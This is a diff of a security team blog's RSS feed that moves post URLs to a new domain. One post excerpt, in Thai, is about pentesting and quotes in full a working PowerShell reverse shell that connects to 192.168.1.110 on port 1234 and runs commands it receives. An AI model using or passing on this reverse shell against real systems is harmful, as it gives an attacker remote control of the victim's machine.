@@ -2,21 +2,21 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Posts on SUAM</title>
-    <link>https://suam-team.github.io/blog/posts/</link>
+    <link>https://suam.wtf/posts/</link>
     <description>Recent content in Posts on SUAM</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Tue, 30 Jun 2020 23:16:18 +0700</lastBuildDate>
     
-	<atom:link href="https://suam-team.github.io/blog/posts/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://suam.wtf/posts/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>What The Fuck Do You Want Windows Defender?</title>
-      <link>https://suam-team.github.io/blog/posts/wtf-do-you-want-windows-defender/</link>
+      <link>https://suam.wtf/posts/wtf-do-you-want-windows-defender/</link>
       <pubDate>Tue, 30 Jun 2020 23:16:18 +0700</pubDate>
       
-      <guid>https://suam-team.github.io/blog/posts/wtf-do-you-want-windows-defender/</guid>
+      <guid>https://suam.wtf/posts/wtf-do-you-want-windows-defender/</guid>
       <description>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ @nikhil_mitt โดยมีหน้าตาประมาณนี้ครับ
 $client = New-Object System.Net.Sockets.TCPClient(&amp;#34;192.168.1.110&amp;#34;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback + &amp;#34;PS &amp;#34; + (pwd).Path + &amp;#34;&amp;gt; &amp;#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); เต็ม ๆ อ่านที่ Link นี้นะครับ
 ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</description>
@@ -24,10 +24,10 @@ $client = New-Object System.Net.Sockets.TCPClient(&amp;#34;192.168.1.110&amp;#34
     
     <item>
       <title>Create a Blog Post with Hugo</title>
-      <link>https://suam-team.github.io/blog/posts/create-a-blog-post-with-hugo/</link>
+      <link>https://suam.wtf/posts/create-a-blog-post-with-hugo/</link>
       <pubDate>Tue, 14 Jan 2020 01:15:59 +0700</pubDate>
       
-      <guid>https://suam-team.github.io/blog/posts/create-a-blog-post-with-hugo/</guid>
+      <guid>https://suam.wtf/posts/create-a-blog-post-with-hugo/</guid>
       <description>In this post, I will present you a short introduction on how to create a blog post, from the the installation of Hugo to publishing your article.
 SUAM Project For the SUAM project, there are two main repositories responsible for content publishing, suam-team/raw for static content and Hugo config, and suam-team/blog which contains public/ directory for HTML. We have deploy.sh for executing and pushing content from a markdown file to a HTML file.</description>
     </item>
